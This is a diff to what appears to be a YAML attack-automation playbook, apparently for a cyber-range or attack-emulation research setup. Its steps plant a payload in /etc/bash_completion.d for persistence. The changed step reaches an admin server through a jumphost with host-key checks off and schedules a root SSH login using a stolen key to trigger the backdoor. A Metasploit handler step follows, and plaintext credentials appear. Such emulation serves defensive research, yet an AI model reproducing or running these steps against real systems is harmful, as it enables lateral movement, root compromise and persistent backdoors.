@@ -216,13 +216,10 @@ commands:
     cmd: "cat /var/www/default/payload > /etc/bash_completion.d/accesss.log"
     session: "foothold"
 
-  - type: ssh
-    cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@172.17.100.121 '. /etc/bash_completion'" | at now + 10 minute
-    hostname: $ADMIN_SERVER
-    username: aecid
-    password: aecid
-    jmp_hostname:  192.42.2.42
-    exit_on_error: False
+ # connect via jumphost to admin host, that ssh to videoserver to reboot
+  - type: shell
+    cmd: ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o "ProxyCommand=ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p aecid@$MGMT_IP" aecid@$ADMIN_SERVER 'echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@172.17.100.121 '. /etc/bash_completion'" | at now + 10 minute' 
+
 
   - type: msf-module
     cmd: exploit/multi/handler
